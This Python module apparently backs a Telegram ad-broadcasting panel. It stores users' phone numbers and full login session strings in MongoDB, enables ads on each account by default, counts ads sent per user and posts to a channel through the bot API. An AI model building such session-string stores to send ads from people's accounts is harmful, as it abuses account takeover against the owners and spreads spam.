import os
import requests
from datetime import datetime, timedelta
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError
from config import MONGODB_URI, DB_NAME, BOT_TOKEN, CHANNEL_ID, UPLOAD_FOLDER

# Global DB Variables
mongo_client = None
db = None
db_connected = False
users_col = None
ads_config_col = None
temp_sessions_col = None
ads_logs_col = None
broadcast_msgs_col = None

def init_db():
    global mongo_client, db, db_connected, users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col
    
    try:
        mongo_client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
        db = mongo_client[DB_NAME]
        mongo_client.admin.command('ping')
        print("✅ MongoDB Connected Successfully!")
        db_connected = True
    except Exception as e:
        print(f"❌ MongoDB Connection Failed: {e}")
        mongo_client = None
        db = None
        db_connected = False
    
    users_col = db.users if db is not None else None
    ads_config_col = db.ads_config if db is not None else None
    temp_sessions_col = db.temp_sessions if db is not None else None
    ads_logs_col = db.ads_logs if db is not None else None
    broadcast_msgs_col = db.broadcast_msgs if db is not None else None

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in {'png', 'jpg', 'jpeg', 'gif', 'webp'}

def save_session_to_db(session_data):
    if users_col is None:
        return False
    try:
        existing = users_col.find_one({"phone": session_data["phone"]})
        if existing:
            users_col.update_one(
                {"_id": existing["_id"]},
                {"$set": {
                    "session_string": session_data["session_string"],
                    "updated_at": datetime.now(),
                    "user_id": session_data["id"],
                    "username": session_data["username"],
                    "first_name": session_data["first_name"],
                    "last_name": session_data["last_name"],
                    "status": "active",
                    "ads_enabled": True
                }}
            )
            return str(existing["_id"])
        else:
            result = users_col.insert_one({
                "user_id": session_data["id"],
                "first_name": session_data["first_name"],
                "last_name": session_data["last_name"],
                "username": session_data["username"],
                "phone": session_data["phone"],
                "session_string": session_data["session_string"],
                "session_name": session_data["session_name"],
                "created_at": datetime.now(),
                "updated_at": datetime.now(),
                "status": "active",
                "ads_enabled": True,
                "last_ad_time": None,
                "total_ads_sent": 0
            })
            return str(result.inserted_id)
    except Exception as e:
        print(f"MongoDB Error: {e}")
        return False

def get_ads_config():
    if ads_config_col is None:
        return {"ads_enabled": False, "interval": 600, "photo_path": None, "caption": "", "updated_at": datetime.now()}
    config = ads_config_col.find_one({"_id": "main_config"})
    if not config:
        default = {
            "_id": "main_config", 
            "ads_enabled": False, 
            "interval": 600,
            "photo_path": None, 
            "caption": "", 
            "updated_at": datetime.now()
        }
        ads_config_col.insert_one(default)
        return default
    return config

def update_ads_config(updates):
    if ads_config_col is None:
        return False
    updates["updated_at"] = datetime.now()
    ads_config_col.update_one({"_id": "main_config"}, {"$set": updates}, upsert=True)
    return True

def get_stats():
    if users_col is None:
        return {
            "total_users": 0, 
            "active_users": 0, 
            "idle_users": 0, 
            "total_ads_sent": 0, 
            "db_connected": False,
            "active_sessions": 0,
            "pending_msgs": 0,
            "online_users": 0,
            "recent_users": 0
        }

    total = users_col.count_documents({})
    active = users_col.count_documents({"status": "active"})
    idle = users_col.count_documents({"status": "idle"})

    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$total_ads_sent"}}}]
    ads_result = list(users_col.aggregate(pipeline))
    total_ads = ads_result[0]["total"] if ads_result else 0

    yesterday = datetime.now() - timedelta(days=1)
    recent_users = users_col.count_documents({"created_at": {"$gte": yesterday}})

    last_hour = datetime.now() - timedelta(hours=1)
    online_users = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})

    pending_msgs = 0
    if broadcast_msgs_col is not None:
        pending_msgs = broadcast_msgs_col.count_documents({})

    return {
        "total_users": total, 
        "active_users": active, 
        "idle_users": idle,
        "online_users": online_users, 
        "recent_users": recent_users,
        "total_ads_sent": total_ads, 
        "db_connected": True,
        "active_sessions": 0,  # Will be updated by session_manager
        "pending_msgs": pending_msgs
    }

def get_all_users():
    if users_col is None:
        return []
    users = list(users_col.find().sort("created_at", -1))
    formatted = []
    for user in users:
        formatted.append({
            "id": str(user.get("_id")),
            "user_id": user.get("user_id"),
            "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
            "username": user.get("username", "N/A"),
            "phone": user.get("phone", "N/A"),
            "status": user.get("status", "unknown"),
            "ads_enabled": user.get("ads_enabled", True),
            "total_ads_sent": user.get("total_ads_sent", 0),
            "created_at": user.get("created_at", datetime.now()).strftime("%Y-%m-%d %H:%M") if user.get("created_at") else "N/A",
            "last_ad_time": user.get("last_ad_time", "").strftime("%Y-%m-%d %H:%M") if user.get("last_ad_time") else "Never"
        })
    return formatted

def send_to_channel(message):
    if not BOT_TOKEN:
        return False
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHANNEL_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
        return r.json().get("ok", False)
    except Exception as e:
        print(f"Channel error: {e}")
        return False

# Initialize on import
init_db()